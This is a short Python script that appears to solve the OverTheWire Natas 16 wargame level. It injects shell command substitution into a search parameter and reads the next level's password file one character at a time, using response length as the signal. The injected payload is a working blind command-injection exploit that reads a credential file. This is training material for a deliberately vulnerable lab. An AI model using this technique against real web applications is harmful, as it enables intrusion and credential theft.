import requests
 
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0987654321"
 
out = ""
 
# $(printf \\$(expr 100 + $(expr h : $(cut -b1 < /etc/natas_webpass/natas17))))
url = "http://natas16.natas.labs.overthewire.org/index.php?needle=%24%28printf+\\\\%24%28expr+100+%2B+%24%28expr+{}+%3A+%24%28cut+-b{}+%3C+%2Fetc%2Fnatas_webpass%2Fnatas17%29%29%29%29&submit=Search"
 
auth = auth=('natas16','<censored>')
 
for i in range(1,33):
	for c in charset:
		res = requests.get(url.format(c,i),auth=auth) 
 
		if len(res.content) > 1105:
			out += c
			print out, len(res.content)
			break
